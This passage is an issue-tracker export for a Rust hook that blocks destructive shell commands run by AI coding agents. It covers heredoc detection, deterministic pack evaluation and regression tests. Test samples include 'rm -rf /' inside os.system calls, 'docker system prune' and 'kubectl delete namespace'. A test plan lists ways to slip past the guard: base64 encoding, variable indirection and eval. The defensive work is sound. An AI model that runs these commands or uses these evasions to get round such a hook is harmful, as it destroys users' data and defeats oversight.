Flexible, slower to load, easier to contribute\n- Hybrid: Core patterns hardcoded, extensions in files\n\n### 2. Pattern Metadata\nEach pattern needs:\n- Unique ID\n- Language\n- ast-grep/tree-sitter pattern\n- Human-readable description\n- Severity level\n- False positive likelihood\n- Suggested alternative\n\n### 3. Pack Integration\nHow do heredoc patterns integrate with existing packs?\n- New pack category: heredoc.*?\n- Sub-patterns within existing packs?\n- Separate configuration section?\n\n### 4. Contextual Patterns\nSome patterns are only dangerous in context:\n- subprocess.run is fine for \"ls\", dangerous for \"rm\"\n- Need to check arguments, not just function calls\n- May require more complex pattern matching\n\n### 5. Allowlisting\nUsers need to allowlist legitimate uses:\n- Test files that exercise dangerous code paths\n- Documentation containing examples\n- CI scripts that intentionally clean up\n\n## Deliverables\n- Pattern specification format (schema)\n- Initial pattern inventory per language\n- Integration plan with pack system\n- Allowlist/exception mechanism design\n\n## Success Criteria\n- Clear, consistent pattern format\n- Coverage of top 10 dangerous patterns per language\n- Smooth integration with existing dcg architecture\n- Path for community contributions","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:30:05.921495349-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:30:05.921495349-05:00","dependencies":[{"issue_id":"git_safety_guard-6sg","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:30:14.503126907-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-6sg","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:30:14.524054168-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-7f5","title":"Implement two-tier detection architecture (regex + ast-grep)","description":"# Two-Tier Architecture for Heredoc Detection\n\n## Key Insight\n\nThe architecture uses a **two-tier approach** to balance performance with accuracy:\n\n1. **Tier 1**: Use fast regex for heredoc detection (the `regex` crate uses Aho-Corasick for static compound patterns and SIMD - it's extremely optimized)\n2. **Tier 2**: Once a heredoc is detected, use AST-aware parsing (ast-grep) rather than reimplementing structural analysis badly with regex\n\nThis ensures 99%+ of commands (which don't contain heredocs) pay only microseconds of overhead, while heredoc commands get proper structural analysis.\n\n## Architecture\n\n```\nCommand Input\n     │\n     ▼\n┌─────────────────────────────────────────────┐\n│  TIER 1: Fast Regex Detection (μs)          │\n│  ─────────────────────────────────────────  │\n│  • regex crate (Aho-Corasick + SIMD)        │\n│  • Static pattern set for heredoc markers   │\n│  • Quick reject: 99%+ commands pass through │\n│  • Cost: ~1-10 microseconds                 │\n└─────────────────────────────────────────────┘\n     │\n     │ heredoc detected?\n     │\n     ├──── NO ───▶ Continue to existing pattern matching\n     │\n     ▼ YES\n┌─────────────────────────────────────────────┐\n│  TIER 2: AST-Aware Analysis (ms)            │\n│  ─────────────────────────────────────────  │\n│  • ast-grep-core for structural parsing     │\n│  • Language-specific pattern matching       │\n│  • Only invoked when heredocs found         │\n│  • Cost: ~1-5 milliseconds                  │\n└─────────────────────────────────────────────┘\n     │\n     ▼\n  Block/Allow Decision\n```\n\n## Tier 1: Regex-Based Heredoc Detection\n\n### Why `regex` crate?\n\nThe Rust `regex` crate is extraordinarily optimized:\n- **Aho-Corasick**: Multi-pattern matching in O(n) time\n- **SIMD**: Vectorized string operations (AVX2, SSE4.2)\n- **Lazy DFA**: JIT-compiled automata\n- **No backtracking**: Guaranteed linear time\n\n### Heredoc Markers to Detect\n\n```rust\nuse regex::RegexSet;\n\nstatic HEREDOC_PATTERNS: LazyLock\u003cRegexSet\u003e = LazyLock::new(|| {\n    RegexSet::new([\n        // Bash heredocs\n        r\"\u003c\u003c-?\\s*['\\\"]?\\w+['\\\"]?\",      // \u003c\u003cEOF, \u003c\u003c'EOF', \u003c\u003c\"EOF\", \u003c\u003c-EOF\n        r\"\u003c\u003c\u003c\",                           // Here-string\n\n        // Inline script flags\n        r\"\\b(python3?|ruby|perl|node)\\s+-[ec]\\s\",\n        r\"\\bsh\\s+-c\\s\",\n        r\"\\bbash\\s+-c\\s\",\n\n        // Pipe to interpreter\n        r\"\\|\\s*(python3?|ruby|perl|node|sh|bash)\\b\",\n    ]).expect(\"heredoc patterns should compile\")\n});\n```\n\n### Quick Reject Logic\n\n```rust\nfn might_contain_heredoc(cmd: \u0026str) -\u003e bool {\n    HEREDOC_PATTERNS.is_match(cmd)\n}\n```\n\nCost: **~1-10 microseconds** for typical commands.\n\n## Tier 2: AST-Aware Analysis\n\nOnly invoked when Tier 1 detects a potential heredoc.\n\n### Why ast-grep?\n\n- **Structural matching**: Understands code structure, not just text\n- **Language-aware**: Different patterns for Python vs Bash vs JS\n- **Pattern syntax**: Intuitive `os.system($CMD)` instead of regex\n- **Battle-tested**: Used in production for large-scale code search\n\n### Example Flow\n\n```rust\nfn check_heredoc(cmd: \u0026str) -\u003e Option\u003cCheckResult\u003e {\n    // Tier 1: Quick regex check\n    if !might_contain_heredoc(cmd) {\n        return None;  // Fast path: no heredoc\n    }\n\n    // Tier 2: Extract and analyze heredoc content\n    let heredoc_info = extract_heredoc(cmd)?;\n    let language = detect_language(\u0026heredoc_info);\n\n    // Parse with ast-grep\n    let matches = match_destructive_patterns(\u0026heredoc_info.content, language);\n\n    if !matches.is_empty() {\n        return Some(CheckResult::blocked(\n            \u0026format!(\"Heredoc contains dangerous pattern: {}\", matches[0].reason),\n            \"heredoc\"\n        ));\n    }\n\n    None  // Heredoc is safe\n}\n```\n\n## Performance Budget\n\n| Operation | Budget | Typical |\n|-----------|--------|---------|\n| Tier 1 regex check | \u003c100μs | 1-10μs |\n| Heredoc extraction | \u003c1ms | 100-500μs |\n| Language detection | \u003c100μs | 10-50μs |\n| AST parsing | \u003c5ms | 500μs-2ms |\n| Pattern matching | \u003c1ms | 100-500μs |\n| **Total (heredoc path)** | \u003c10ms | 1-5ms |\n\n## Implementation Priority\n\n1. **First**: Implement Tier 1 with `regex` crate\n2. **Second**: Add heredoc extraction logic\n3. **Third**: Integrate ast-grep for Tier 2\n4. **Fourth**: Optimize based on benchmarks\n\n## Dependencies\n\n```toml\n# Tier 1: Fast regex\nregex = \"1.10\"  # Already highly optimized\n\n# Tier 2: AST analysis\nast-grep-core = \"0.40\"\nast-grep-language = { version = \"0.37\", features = [\"bash\", \"python\", \"javascript\"] }\n```\n","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T18:54:46.613326588-05:00","created_by":"ubuntu","updated_at":"2026-01-07T19:37:42.934624617-05:00","closed_at":"2026-01-07T19:37:42.934624617-05:00","close_reason":"Duplicate of git_safety_guard-2ta which is integrated into dependency graph"}
{"id":"git_safety_guard-8wt","title":"Create comprehensive test suite for heredoc detection","description":"## Objective\n\nCreate comprehensive test coverage for heredoc detection and AST-based pattern matching, including unit tests, integration tests, and bypass attempt tests.\n\n## Test Categories\n\n### 1. Unit Tests\n\n#### Heredoc Detection Tests\n- Bash heredoc variants: \u003c\u003cEOF, \u003c\u003c-EOF, \u003c\u003c\u003c, \u003c\u003c'EOF', \u003c\u003c\"EOF\"\n- Python multiline strings as heredocs: python3 -c '''...'''\n- Node.js: node -e '...', node \u003c\u003cEOF\n- Perl: perl -e '...', perl \u003c\u003c'END'\n- Ruby: ruby -e '...', ruby \u003c\u003c~RUBY\n\n#### Language Detection Tests\n- Detection from command prefix (python3, node, ruby, perl, bash)\n- Detection from shebang (#!/usr/bin/env python3)\n- Detection from content heuristics (import statements, require(), etc.)\n- Fallback behavior for unknown languages\n\n#### Pattern Matching Tests\n- Each destructive pattern per language\n- Each safe pattern (things that look dangerous but aren't)\n- Edge cases in quoting and escaping\n- Variable interpolation handling\n\n### 2. Integration Tests\n\n#### Pipeline Tests\n- Full flow from JSON input to block/allow decision\n- Heredoc commands correctly trigger deep analysis\n- Non-heredoc commands still use fast path\n- Performance within latency budget\n\n#### Error Handling Tests\n- Malformed heredoc syntax\n- Unparseable content (binary, corrupted)\n- Unknown languages fall back gracefully\n- Timeout handling\n\n### 3. Bypass Attempt Tests (Security Focus)\n\nThese are CRITICAL - they test the actual attack vectors we're trying to block.\n\n#### Encoding Bypasses\n- Base64 encoded commands in heredocs\n- Hex encoding\n- Unicode obfuscation\n- String concatenation to build dangerous strings\n\n#### Indirection Bypasses\n- Variable expansion: CMD=\"rm\"; ${CMD} -rf\n- Array expansion: arr=(rm -rf /); \"${arr[@]}\"\n- Command substitution: $(echo rm) -rf\n- Eval-based: eval \"dangerous command\"\n\n#### Language-Specific Bypasses\n- Python: __import__, exec(), compile()\n- JavaScript: eval(), Function(), require()\n- Ruby: send(), instance_eval(), Kernel.`\n- Perl: eval, do EXPR, qx//\n\n#### Heredoc Nesting\n- Heredoc containing another heredoc\n- Heredoc with escaped delimiters\n- Heredoc across multiple commands (pipelines)\n\n### 4. False Positive Tests\n\nEnsure we DON'T block legitimate uses:\n- Documentation containing command examples\n- Grep patterns searching for dangerous commands\n- Test files containing example commands\n- Config files with commented dangerous commands\n- bd create with descriptions about dangerous patterns\n\n### 5. Performance Tests\n\n- Latency benchmarks for various command types\n- Memory usage under load\n- Concurrent command checking\n- Large heredoc handling\n\n## Test Infrastructure\n\n### Test Data Directory\n```\ntests/\n  fixtures/\n    heredocs/\n      bash/\n      python/\n      javascript/\n      ruby/\n      perl/\n    bypass_attempts/\n    false_positives/\n```\n\n### Test Macros\n```rust\n// Test that a command is blocked\nassert_blocked!(\"python3 \u003c\u003c 'EOF'\\nimport os; os.system('rm -rf /')\\nEOF\");\n\n// Test that a command is allowed\nassert_allowed!(\"python3 \u003c\u003c 'EOF'\\nprint('hello')\\nEOF\");\n\n// Test specific pattern match\nassert_pattern_matches!(\"python\", \"os.system($CMD)\", \"os.system('rm -rf /')\");\n```\n\n## Success Criteria\n\n- 100% coverage of documented attack vectors\n- Zero false positives in false_positive test suite\n- All performance tests pass within budget\n- Clear documentation of what each test validates\n\n## Dependencies\n\n- Integration pipeline must be complete\n- All language patterns must be defined\n- Performance benchmarking infrastructure\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:40:09.282575411-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:40:16.193121871-05:00","dependencies":[{"issue_id":"git_safety_guard-8wt","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T18:40:16.212012296-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-8wt","depends_on_id":"git_safety_guard-unit","type":"blocks","created_at":"2026-01-07T19:37:43.125748306-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e","title":"Epic: Core Pipeline Correctness \u0026 Determinism","description":"# Epic: Core Pipeline Correctness \u0026 Determinism\n\n## Why this epic exists\n\n`dcg` is only useful if it is **correct, predictable, and consistent**:\n\n- Correct: enabled packs actually run when their keywords appear.\n- Predictable: the same input yields the same allow/deny + the same reason.\n- Consistent: hook-mode decisions match `dcg test` and any future \"explain\" tooling.\n\nRight now the codebase has a critical architectural correctness gap:\n\n- Hook mode short-circuits early when the top-level command contains no `git`/`rm` (`src/main.rs:587`).\n- `global_quick_reject` also only checks `git`/`rm` (`src/packs/mod.rs:383`).\n\nAs a result, **non-core packs (docker/kubectl/databases/etc.) are effectively unreachable in real hook traffic**, even if enabled in config. This is a trust-destroying failure mode because the CLI (`dcg test`) *can* report a block while the hook *allows* the same command.\n\nWe also have a determinism gap:\n\n- Pack evaluation order is currently based on iterating a `HashSet` (`src/packs/mod.rs:299+`), which is not stable.\n- If multiple packs would block, the user-visible reason (and sometimes which pack is attributed) can vary run-to-run.\n\nFinally, the project is mid-migration:\n\n- Legacy pattern matching exists in `src/main.rs` and duplicates core pack patterns.\n- Hook input parsing and denial output are duplicated between `src/main.rs` and `src/hook.rs`.\n\nThis epic fixes the above so future features (false-positive immunity, heredoc scanning, AST analysis, explainability) are built on a solid, deterministic foundation.\n\n## Goals\n\n1. **Pack reachability:** if an enabled pack’s keywords appear in the command, the pack is actually evaluated in hook mode.\n2. **Deterministic decisions:** stable pack ordering + stable pattern identity in results.\n3. **Single source of truth:** one hook parser and one allow/deny pipeline used by hook mode and CLI test mode.\n4. **Performance preserved:** keep the hot path fast (microseconds) and avoid per-invocation regex compilation.\n5. **Naming alignment:** eliminate `git_safety_guard`/`dcg` naming drift in env vars, scripts, docs, and output.\n\n## Non-goals (for this epic)\n\n- Adding new destructive patterns/categories (handled by the pack/library work).\n- Backwards compatibility guarantees (early-stage project; prefer correctness and clarity).\n\n## Acceptance criteria (epic-level)\n\n- With `containers.docker` enabled, `docker system prune` is blocked in *hook mode* (stdin JSON) and in `dcg test`, with the same pack attribution and stable reason.\n- With `kubernetes.kubectl` enabled, `kubectl delete namespace foo` is blocked similarly.\n- Re-running the same blocked input 100 times yields identical `pack_id`/`pattern_name` attribution.\n- No per-command regex compilation for config overrides on the hot path.\n\n## Notes for future self\n\n- This epic must be completed **before** we trust any new pack work or any UX/\"explain\" features.\n- If we later add a scoring system (severity/precision), this epic should provide the deterministic substrate (stable ordering + stable pattern IDs).\n","status":"open","priority":0,"issue_type":"epic","created_at":"2026-01-07T19:57:03.282180904-05:00","created_by":"ubuntu","updated_at":"2026-01-07T19:57:03.282180904-05:00"}
{"id":"git_safety_guard-99e.1","title":"BUG: Non-core packs are unreachable in hook mode (global quick reject)","description":"## Summary\n\nIn hook mode, `dcg` returns early for any command that does not contain `git` or `rm`, which makes all non-core packs (docker/kubectl/databases/etc.) effectively unreachable in real Claude Code hook traffic.\n\nThis is a correctness bug and a trust issue because `dcg test` *can* report a block while the actual hook path silently allows.\n\n## Reproduction (expected vs actual)\n\nPrereq: enable a non-core pack (e.g., `containers.docker`) in config.\n\nInput (hook JSON):\n```json\n{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"docker system prune\"}}\n```\n\n- Expected: DENY (pack `containers.docker`, pattern `system-prune`).\n- Actual (today): ALLOW due to early return at `src/main.rs:587` and `global_quick_reject` only checking `git`/`rm`.\n\n## Root cause\n\n- `src/main.rs:587`: `if quick_reject(\u0026command) \u0026\u0026 global_quick_reject(\u0026command) { return; }`\n- `src/packs/mod.rs:383`: `global_quick_reject` only checks for substrings `git` and `rm`.\n\nSo any command lacking these substrings exits before `REGISTRY.check_command(...)` runs.\n\n## Design constraints\n\n- Must preserve hot-path performance for the 99% case.\n- Must remain correct under arbitrary enabled pack sets.\n\n## Proposed fix options\n\n### Option A (recommended): pack-aware global quick reject\n\n- After loading config, compute enabled packs.\n- Build a fast keyword-gating check that returns “definitely safe to skip packs” only if the command contains **none** of:\n  - core keywords (`git`, `rm`)\n  - keywords for enabled packs (`docker`, `kubectl`, `psql`, etc.)\n\nImplementation can start simple:\n- iterate the enabled packs’ `Pack.keywords` and `memmem::find` for each keyword\n- (optional later) replace with an Aho-Corasick automaton or `regex::RegexSet` for large keyword sets\n\n### Option B: delete global quick reject, rely on per-pack `might_match`\n\n- Always run `REGISTRY.check_command` (it already keyword-gates per pack).\n- Might be slightly slower but likely still fine; measure.\n\n## Acceptance criteria\n\n1. With `containers.docker` enabled, `docker system prune` is denied in hook mode.\n2. With `kubernetes.kubectl` enabled, `kubectl delete namespace foo` is denied in hook mode.\n3. With `database.postgresql` enabled, destructive SQL strings (if passed directly) are denied when appropriate.\n4. `dcg test` and hook mode agree for the same command.\n5. Add regression tests that would have caught this:\n   - a unit/integration test that runs the hook pipeline on a JSON input and asserts denial for a non-git/rm command.\n\n## Notes\n\nThis bug blocks meaningful work on most non-core packs until fixed.\n","status":"open","priority":0,"issue_type":"bug","created_at":"2026-01-07T19:58:01.855008972-05:00","created_by":"ubuntu","updated_at":"2026-01-07T19:58:01.855008972-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.1","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T19:58:01.8564148-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.1.1","title":"Implement pack-aware global quick reject","description":"## Objective\n\nFix the hook pipeline so that enabled non-core packs are evaluated when their keywords appear in the command.\n\n## Background\n\nThe current hook pipeline returns early when the command contains neither `git` nor `rm`, which prevents packs like Docker/Kubernetes/DB from ever running.\n\nSee parent bug for reproduction.\n\n## Implementation plan\n\n1. Load config (already done in hook mode) and compute `enabled_pack_ids()`.\n2. Expand enabled categories to concrete pack IDs (use `PackRegistry::expand_enabled`).\n3. Build a **keyword union** from all enabled packs’ `Pack.keywords`.\n4. Replace the current early-return condition with:\n   - “return early only if no enabled pack keywords exist in the command”\n\n### Suggested algorithm (simple first)\n\n- For each keyword in the union:\n  - `memmem::find(cmd.as_bytes(), kw.as_bytes()).is_some()`\n- If none match, skip pack evaluation.\n\n### Considerations\n\n- Keywords are case-sensitive today. Decide whether keywords should be case-sensitive (probably yes for CLI names, but SQL keywords may need both `DROP` and `drop`).\n- Avoid allocations on the hot path: build the union once per invocation, ideally without heap churn.\n- Keep this check separate from the legacy `quick_reject` so it’s not accidentally constrained to `git`/`rm` again.\n\n## Acceptance criteria\n\n- `docker system prune` reaches `REGISTRY.check_command` when docker pack is enabled.\n- `kubectl delete namespace foo` reaches `REGISTRY.check_command` when kubectl pack is enabled.\n- For a command like `ls -la`, the hook returns early (no expensive regex) and remains sub-millisecond.\n","status":"open","priority":0,"issue_type":"task","created_at":"2026-01-07T19:58:22.543207508-05:00","created_by":"ubuntu","updated_at":"2026-01-07T19:58:22.543207508-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.1.1","depends_on_id":"git_safety_guard-99e.1","type":"parent-child","created_at":"2026-01-07T19:58:22.54465821-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.1.2","title":"Add regression tests: hook reaches non-core packs","description":"## Objective\n\nAdd tests that would fail under the current bug (non-core packs unreachable) and pass once fixed.\n\n## Why tests are critical\n\nThis bug is easy to reintroduce during future performance work (e.g., adding new global quick rejects). We need a permanent regression test suite that exercises:\n\n- Hook-mode pipeline (stdin JSON) end-to-end\n- Non-core pack enablement\n- CLI vs hook consistency\n\n## Test plan\n\n### 1) Hook-mode integration test\n\n- Build a JSON input for `tool_name=Bash` and command `docker system prune`.\n- Ensure docker pack is enabled via config for the test (env var override or temp config file).\n- Execute the actual binary in test harness (or call the hook pipeline function directly if exposed).\n- Assert:\n  - stdout contains JSON\n  - `permissionDecision` is `deny`\n  - pack attribution includes `containers.docker` (once deterministic metadata is implemented)\n\n### 2) CLI `dcg test` parity test\n\n- Run `dcg test \"docker system prune\" --with-packs containers.docker`.\n- Assert it reports BLOCKED.\n- (Optionally) ensure hook mode reports the same.\n\n### 3) Negative control\n\n- With docker pack enabled, `docker ps` should ALLOW.\n\n## Acceptance criteria\n\n- Tests fail on current main branch (before bugfix) and pass after.\n- Tests run fast and do not require network.\n","status":"open","priority":0,"issue_type":"task","created_at":"2026-01-07T19:58:43.071778915-05:00","created_by":"ubuntu","updated_at":"2026-01-07T19:58:43.071778915-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.1.2","depends_on_id":"git_safety_guard-99e.1","type":"parent-child","created_at":"2026-01-07T19:58:43.073195963-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.2","title":"Deterministic pack evaluation + return pattern identity","description":"## Objective\n\nMake allow/deny decisions **deterministic and debuggable** by:\n\n1. Evaluating enabled packs in a stable order.\n2. Returning a stable identifier for the matched rule (pack_id + pattern_name).\n\n## Background\n\n`PackRegistry::check_command` currently iterates enabled packs using a `HashSet` (`src/packs/mod.rs`). HashSet iteration order is not stable, so if multiple packs could block a command the chosen reason/attribution can vary run-to-run.\n\nEven when only one pack blocks, future features (explainability, allowlisting by ID, analytics) require stable pattern identity.\n\n## Proposed changes\n\n### 1) Stable pack ordering\n\n- Expand enabled categories into concrete pack IDs.\n- Sort pack IDs deterministically (e.g., lexicographic) OR define an explicit priority ordering.\n\nRecommended: **explicit ordering tiers**, then lexicographic within tier:\n\n1. `core.*` packs\n2. safety-critical infra packs (disk, permissions)\n3. kubernetes/containers/cloud/infrastructure\n4. database packs\n5. `strict_git` (or decide if strict should be earlier; justify)\n6. package managers\n\nRationale: prefer the most human-relevant reason (e.g., “rm -rf on / is extremely dangerous” over generic rm).\n\n### 2) Include `pattern_name` in results\n\n- Extend `Pack::matches_destructive` to return the matched `DestructivePattern` (not just the reason string).\n- Extend `CheckResult` to include:\n  - `pack_id`\n  - `pattern_name` (optional for unnamed patterns)\n  - `reason`\n\n### 3) Keep performance sane\n\n- Deterministic ordering can be precomputed per invocation after config load.\n- Avoid allocations in hot paths; keep `reason` static strings where possible.\n\n## Acceptance criteria\n\n- Running the same blocked input 100 times yields identical `pack_id` + `pattern_name`.\n- If multiple packs match, the chosen attribution is stable and documented.\n- Hook deny output and `dcg test` (once unified) can display `pack_id` and `pattern_name`.\n\n## Follow-ups unlocked\n\n- Allowlisting by `(pack_id, pattern_name)` without forcing users to write regex.\n- `dcg test --explain` can show the exact rule that matched.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T19:59:48.537370468-05:00","created_by":"ubuntu","updated_at":"2026-01-07T19:59:48.537370468-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.2","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T19:59:48.547707155-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.2.1","title":"Implement stable pack iteration order","description":"## Objective\n\nEnsure `PackRegistry::check_command` evaluates packs in a deterministic order.\n\n## Implementation notes\n\n- Replace iteration over `HashSet` with a `Vec` of pack IDs.\n- After expanding categories, produce a stable ordered list:\n  - explicit tiering (see parent) OR simple `sort_unstable()` with documented semantics.\n\n## Acceptance criteria\n\n- If multiple packs would block the same command, the same pack is always selected.\n- Ordering is unit-tested.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:06.097069365-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:06.097069365-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.2.1","depends_on_id":"git_safety_guard-99e.2","type":"parent-child","created_at":"2026-01-07T20:00:06.098252353-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.2.2","title":"Propagate matched pattern metadata (pack_id + pattern_name)","description":"## Objective\n\nReturn the matched pattern identity end-to-end.\n\n## Implementation notes\n\n- Change `Pack::matches_destructive` to return the matched `DestructivePattern` (or its `{reason, name}`) instead of only `reason`.\n- Update `Pack::check` and `PackRegistry::check_command` to include `pattern_name` in the result.\n- Decide representation:\n  - `Option\u003c\u0026'static str\u003e` internally\n  - `Option\u003cString\u003e` in `CheckResult` for output (or keep static via Cow)\n\n## Acceptance criteria\n\n- A block result includes:\n  - `pack_id`\n  - `pattern_name` (when defined)\n  - `reason`\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:11.130270969-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:11.130270969-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.2.2","depends_on_id":"git_safety_guard-99e.2","type":"parent-child","created_at":"2026-01-07T20:00:11.131660786-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.2.3","title":"Add deterministic attribution + pattern identity tests","description":"## Objective\n\nAdd tests that enforce determinism and pattern identity.\n\n## Test plan\n\n- Construct an input that matches multiple packs (or multiple patterns) and assert the chosen `pack_id/pattern_name` is stable.\n- Add a snapshot-style test for `dcg test` output once CLI/hook are unified.\n\n## Acceptance criteria\n\n- Tests fail if iteration order becomes nondeterministic.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:16.16252083-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:08:21.658765479-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.2.3","depends_on_id":"git_safety_guard-99e.2","type":"parent-child","created_at":"2026-01-07T20:00:16.163714999-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.2.3","depends_on_id":"git_safety_guard-99e.2.1","type":"blocks","created_at":"2026-01-07T20:13:24.386751714-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.2.3","depends_on_id":"git_safety_guard-99e.2.2","type":"blocks","created_at":"2026-01-07T20:13:29.421657486-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.3","title":"Unify hook pipeline (single parser/output); retire legacy matcher","description":"## Objective\n\nReduce duplication and inconsistency by making hook-mode and CLI-mode use a single, shared pipeline:\n\n- One hook input parser\n- One normalization step\n- One decision engine (packs + overrides + context layers)\n- One denial output formatter\n\nThen retire the legacy SAFE/DESTRUCTIVE pattern logic currently duplicated in `src/main.rs`.\n\n## Background\n\nToday the repo has:\n\n- Hook parsing duplicated in `src/main.rs` and in `src/hook.rs`.\n- Deny output duplicated (`deny()` and `hook::output_denial`).\n- Legacy patterns in `src/main.rs` that overlap with `core.git` and `core.filesystem` packs.\n\nThis increases maintenance burden and risks divergence:\n\n- The same command may be treated differently depending on which path is used.\n- Fixes may be applied to packs but not legacy, or vice versa.\n\n## Proposed approach\n\n1. Expose a single internal function like `evaluate_command(config, raw_command) -\u003e Decision`.\n2. Hook mode:\n   - parse input via `hook::read_hook_input` / `hook::extract_command`\n   - call evaluator\n   - on deny: use `hook::output_denial`\n3. CLI `dcg test`:\n   - normalize and call evaluator\n   - print human output\n\n4. Retire legacy patterns:\n   - Ensure `core.git` + `core.filesystem` packs fully cover the legacy patterns.\n   - Remove the legacy SAFE_PATTERNS/DESTRUCTIVE_PATTERNS code path.\n\n## Acceptance criteria\n\n- Hook mode and `dcg test` agree on allow/deny for all existing E2E cases.\n- Unit tests cover the shared evaluator (no hidden behavior in `main`).\n- No duplicate deny formatting code remains.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:33.342948016-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:33.342948016-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.3","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T20:00:33.3440917-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.3.1","title":"Create shared evaluator API (hook + CLI)","description":"## Objective\n\nImplement a single internal evaluation entry point used by both hook mode and CLI.\n\n## Requirements\n\n- Inputs:\n  - raw command string\n  - loaded config\n  - enabled packs (expanded)\n- Outputs:\n  - Allow / Deny\n  - Deny includes `pack_id`, `pattern_name`, `reason`\n\n## Acceptance criteria\n\n- Hook and CLI can both call the evaluator without re-implementing parsing.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:52.440864652-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:52.440864652-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.3.1","depends_on_id":"git_safety_guard-99e.3","type":"parent-child","created_at":"2026-01-07T20:00:52.442017573-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.3.2","title":"Refactor hook-mode main() to use src/hook.rs","description":"## Objective\n\nMake hook mode use `hook::read_hook_input`, `hook::extract_command`, and `hook::output_denial`.\n\n## Acceptance criteria\n\n- `src/main.rs` no longer defines its own HookInput/HookOutput structs.\n- Denials always go through `hook::output_denial`.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:57.473147495-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:57.473147495-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.3.2","depends_on_id":"git_safety_guard-99e.3","type":"parent-child","created_at":"2026-01-07T20:00:57.474491536-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.3.2","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:12:54.191454699-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.3.3","title":"Refactor CLI dcg test to share evaluator semantics","description":"## Objective\n\nEnsure `dcg test` uses the same normalization, override evaluation, context layers, and pack evaluation ordering as hook mode.\n\n## Acceptance criteria\n\n- `dcg test` and hook-mode JSON input agree on allow/deny + attribution for the same command.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:01:02.50501207-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:01:02.50501207-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.3.3","depends_on_id":"git_safety_guard-99e.3","type":"parent-child","created_at":"2026-01-07T20:01:02.506104728-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.3.3","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:12:59.224813761-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.3.4","title":"Remove legacy SAFE_PATTERNS/DESTRUCTIVE_PATTERNS from src/main.rs","description":"## Objective\n\nEliminate the legacy hardcoded pattern lists in `src/main.rs` once parity with packs is verified.\n\n## Why\n\nDuplication increases risk of divergence and makes it harder to reason about false positives.\n\n## Acceptance criteria\n\n- All existing unit + E2E tests still pass.\n- `core.git` and `core.filesystem` packs fully cover the legacy behavior.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:01:07.537906195-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:01:07.537906195-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.3.4","depends_on_id":"git_safety_guard-99e.3","type":"parent-child","created_at":"2026-01-07T20:01:07.539030542-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.3.4","depends_on_id":"git_safety_guard-99e.3.2","type":"blocks","created_at":"2026-01-07T20:13:04.258280353-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.3.4","depends_on_id":"git_safety_guard-99e.3.3","type":"blocks","created_at":"2026-01-07T20:13:09.290073454-05:00","created_by":"ubuntu"}]}
